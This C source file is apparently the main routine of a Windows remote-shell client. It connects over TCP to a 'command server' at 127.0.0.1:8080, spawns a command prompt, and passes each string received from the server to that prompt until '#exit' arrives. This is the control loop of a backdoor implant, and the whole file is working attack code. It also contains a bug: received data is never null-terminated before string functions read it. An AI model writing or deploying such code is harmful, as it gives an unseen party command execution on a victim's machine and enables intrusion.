/*
	Main code
	Handles startup, main control loop, calls to other functions, etc
*/

#include "common.h"
#include "utils.h"
#include "cmd.h"

/*
	Main function
*/
int main() {
	// initialize WinSock and connect to the command server
	initWinSock();
	SOCKET cmdSock = INVALID_SOCKET;
	connectTCP("127.0.0.1", 8080, &cmdSock);
	// spawn a command prompt and the associated threads
	startCMD(cmdSock);
	// main program loop
	char buff[4096];
	int res = recv(cmdSock, buff, 4096, 0);
	while (res != SOCKET_ERROR && strcmp(buff, "#exit") != 0) {
		inputToCMD(buff, strlen(buff));
		res = recv(cmdSock, buff, 4096, 0);
	}
}